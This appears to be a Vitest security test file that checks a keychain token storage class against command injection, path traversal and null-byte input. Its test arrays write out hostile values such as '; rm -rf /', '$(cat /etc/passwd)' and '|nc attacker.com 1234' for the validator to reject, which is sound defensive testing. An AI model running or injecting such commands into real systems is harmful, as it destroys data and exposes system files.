import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { promises as fs } from 'fs';

// Create hoisted mock for execFileAsync
const mockExecFileAsync = vi.hoisted(() => vi.fn());

// Mock child_process module for test interception
vi.mock('child_process', () => ({
  execFile: vi.fn(),
}));

// Mock util.promisify to return our hoisted mock function
vi.mock('util', () => ({
  promisify: () => mockExecFileAsync,
}));

// Mock fs promises
vi.mock('fs', () => ({
  promises: {
    mkdir: vi.fn(),
    writeFile: vi.fn(),
    readFile: vi.fn(),
    unlink: vi.fn(),
  },
}));
const mockedFs = vi.mocked(fs);

// Import after mocks are set up
import { KeychainTokenStorage } from '../../implementations/keychain-token-storage.js';
import type { TokenData } from '@mcp-funnel/core';

describe('KeychainTokenStorage - Command Injection Security Tests', () => {
  let mockToken: TokenData;

  beforeEach(() => {
    vi.clearAllMocks();

    mockToken = {
      accessToken: 'test-access-token',
      expiresAt: new Date(Date.now() + 3600000), // 1 hour from now
      tokenType: 'Bearer',
      scope: 'read write',
    };
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('serverId validation at construction', () => {
    it('should accept valid serverIds', () => {
      // Valid characters: alphanumeric, dots, underscores, hyphens
      const validServerIds = [
        'test-server',
        'server.example.com',
        'my_server123',
        'server-123.example_site',
        '123',
        'a',
        'A-Z_0-9.test',
      ];

      validServerIds.forEach((serverId) => {
        expect(() => new KeychainTokenStorage(serverId)).not.toThrow();
      });
    });

    it('should reject serverIds with dangerous special characters', () => {
      const maliciousServerIds = [
        // Command injection attempts
        '; rm -rf /',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        '|nc attacker.com 1234',
        '&& rm -rf /',
        '|| echo "pwned"',

        // Shell metacharacters
        'server;rm',
        'server|cat',
        'server&echo',
        'server$(echo)',
        'server`echo`',
        'server"test',
        "server'test",
        'server\\test',
        'server test', // space
        'server\ttest', // tab
        'server\ntest', // newline
        'server\rtest', // carriage return
        'server*test',
        'server?test',
        'server[test]',
        'server{test}',
        'server(test)',
        'server<test>',
        'server#test',
        'server%test',
        'server@test',
        'server!test',
        'server~test',
        'server^test',
        'server+test',
        'server=test',

        // Advanced injection attempts
        '"; echo pwned; #',
        "'; echo pwned; #",
        '$(IFS=,;cat<<<uname,)',
        '${IFS}cat${IFS}/etc/passwd',
        '$((0x41))',
        '\\x41\\x42',

        // URL-encoded attacks
        '%3B%20rm%20-rf%20/',
        '%24%28cat%20/etc/passwd%29',

        // Unicode and special encodings
        'server\u0000test', // null byte
        'server\u000Atest', // line feed
        'server\u000Dtest', // carriage return

        // Empty or very problematic inputs
        '',
        ' ',
        '\t',
        '\n',
        '\r',
      ];

      maliciousServerIds.forEach((serverId) => {
        expect(() => new KeychainTokenStorage(serverId)).toThrow(
          /Invalid serverId: contains unsafe characters/,
        );
      });
    });
  });

  describe('execFile usage prevents command injection', () => {
    beforeEach(() => {
      Object.defineProperty(process, 'platform', { value: 'darwin' });
    });

    it('should use execFile instead of exec for store operations', async () => {
      const storage = new KeychainTokenStorage('valid-server');
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

      await storage.store(mockToken);

      // Verify execFile was called with proper argument array (not string)
      expect(mockExecFileAsync).toHaveBeenCalledWith('security', [
        'add-generic-password',
        '-a',
        'mcp-funnel:valid-server',
        '-s',
        'mcp-funnel',
        '-w',
        expect.any(String), // JSON token data
        '-U',
      ]);

      // Verify no shell interpretation - arguments are passed as array
      const callArgs = mockExecFileAsync.mock.calls[0];
      expect(callArgs[0]).toBe('security'); // Command
      expect(Array.isArray(callArgs[1])).toBe(true); // Arguments array
    });

    it('should use execFile instead of exec for retrieve operations', async () => {
      const storage = new KeychainTokenStorage('valid-server');
      const tokenJson = JSON.stringify({
        accessToken: mockToken.accessToken,
        expiresAt: mockToken.expiresAt.toISOString(),
        tokenType: mockToken.tokenType,
        scope: mockToken.scope,
      });

      mockExecFileAsync.mockResolvedValue({ stdout: tokenJson, stderr: '' });

      await storage.retrieve();

      expect(mockExecFileAsync).toHaveBeenCalledWith('security', [
        'find-generic-password',
        '-a',
        'mcp-funnel:valid-server',
        '-s',
        'mcp-funnel',
        '-w',
      ]);
    });

    it('should use execFile instead of exec for clear operations', async () => {
      const storage = new KeychainTokenStorage('valid-server');
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });
      mockedFs.unlink.mockResolvedValue(undefined);

      await storage.clear();

      expect(mockExecFileAsync).toHaveBeenCalledWith('security', [
        'delete-generic-password',
        '-a',
        'mcp-funnel:valid-server',
        '-s',
        'mcp-funnel',
      ]);
    });
  });

  describe('Windows platform security', () => {
    beforeEach(() => {
      Object.defineProperty(process, 'platform', { value: 'win32' });
    });

    it('should use execFile for Windows cmdkey operations', async () => {
      const storage = new KeychainTokenStorage('valid-server');
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

      await storage.store(mockToken);

      expect(mockExecFileAsync).toHaveBeenCalledWith('cmdkey', [
        '/generic:mcp-funnel:valid-server',
        '/user:mcp-funnel',
        `/pass:${JSON.stringify({
          accessToken: mockToken.accessToken,
          expiresAt: mockToken.expiresAt.toISOString(),
          tokenType: mockToken.tokenType,
          scope: mockToken.scope,
        })}`,
      ]);
    });

    it('should use execFile for Windows credential deletion', async () => {
      const storage = new KeychainTokenStorage('valid-server');
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });
      mockedFs.unlink.mockResolvedValue(undefined);

      await storage.clear();

      expect(mockExecFileAsync).toHaveBeenCalledWith('cmdkey', [
        '/delete:mcp-funnel:valid-server',
      ]);
    });
  });

  describe('key generation security', () => {
    it('should safely handle special characters in generated keys', async () => {
      // Even if somehow special characters got through validation,
      // they should be handled safely by execFile
      const storage = new KeychainTokenStorage('valid-server');
      Object.defineProperty(process, 'platform', { value: 'darwin' });
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

      await storage.store(mockToken);

      // Verify the key is passed as a separate argument, not interpolated
      const callArgs = mockExecFileAsync.mock.calls[0];
      const argumentsArray = callArgs[1] as string[];

      // The key should be in the arguments array as a separate element
      expect(argumentsArray.includes('mcp-funnel:valid-server')).toBe(true);

      // Verify no string concatenation/interpolation occurred
      // Arguments: ['add-generic-password', '-a', 'mcp-funnel:valid-server', '-s', 'mcp-funnel', '-w', value, '-U']
      expect(typeof argumentsArray[2]).toBe('string'); // The -a argument value
      expect(argumentsArray[2]).toBe('mcp-funnel:valid-server');
    });
  });

  describe('error handling maintains security', () => {
    it('should not expose command details in error messages', async () => {
      Object.defineProperty(process, 'platform', { value: 'darwin' });
      const storage = new KeychainTokenStorage('valid-server');

      // Mock execFile to throw an error
      const commandError = new Error('Command failed');
      mockExecFileAsync.mockRejectedValue(commandError);

      // Mock successful file fallback
      mockedFs.mkdir.mockResolvedValue(undefined);
      mockedFs.writeFile.mockResolvedValue(undefined);

      // Should not throw - should fallback to file storage
      await expect(storage.store(mockToken)).resolves.not.toThrow();

      // Verify fallback was used
      expect(mockedFs.writeFile).toHaveBeenCalled();
    });
  });

  describe('regression tests for original vulnerability', () => {
    it('should prevent the original command injection vulnerability', () => {
      // These attacks would have worked with the original exec() implementation
      const attackVectors = [
        '"; rm -rf /; echo "',
        "'; cat /etc/passwd; echo '",
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        '| nc attacker.com 1234',
        '&& echo "pwned"',
      ];

      attackVectors.forEach((attack) => {
        expect(() => new KeychainTokenStorage(attack)).toThrow();
      });
    });

    it('should verify execFile is called with argument arrays not string commands', async () => {
      const storage = new KeychainTokenStorage('test-server');
      Object.defineProperty(process, 'platform', { value: 'darwin' });
      mockExecFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

      await storage.store(mockToken);

      // Critical: verify that execFileAsync was called with separate arguments
      // not a concatenated string that could be vulnerable to injection
      const [command, args] = mockExecFileAsync.mock.calls[0];

      expect(command).toBe('security');
      expect(Array.isArray(args)).toBe(true);
      expect(args.length).toBe(8); // All arguments should be separate array elements

      // Verify no argument contains shell metacharacters as a result of interpolation
      args.forEach((arg: string) => {
        expect(typeof arg).toBe('string');
        // The arguments themselves are safe since they're not interpreted by shell
        // This is the key security improvement: execFile bypasses shell interpretation
      });
    });
  });

  describe('comprehensive malicious input validation', () => {
    it('should reject all forms of shell metacharacters', () => {
      const shellMetacharacters = [
        ';',
        '|',
        '&',
        '$',
        '`',
        '"',
        "'",
        '\\',
        '\n',
        '\r',
        '\t',
        ' ',
        '(',
        ')',
        '[',
        ']',
        '{',
        '}',
        '<',
        '>',
        '*',
        '?',
        '#',
        '!',
        '~',
        '^',
        '%',
        '@',
        '+',
        '=',
      ];

      shellMetacharacters.forEach((char) => {
        const maliciousId = `server${char}test`;
        expect(() => new KeychainTokenStorage(maliciousId)).toThrow();
      });
    });

    it('should prevent null byte injection', () => {
      const nullByteAttacks = [
        'server\x00',
        'server\u0000',
        '\x00server',
        'server\x00/etc/passwd',
      ];

      nullByteAttacks.forEach((attack) => {
        expect(() => new KeychainTokenStorage(attack)).toThrow();
      });
    });

    it('should prevent path traversal in serverId', () => {
      const pathTraversalAttacks = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        '~/../../etc/passwd',
        '$HOME/../etc/passwd',
      ];

      pathTraversalAttacks.forEach((attack) => {
        expect(() => new KeychainTokenStorage(attack)).toThrow();
      });
    });
  });
});
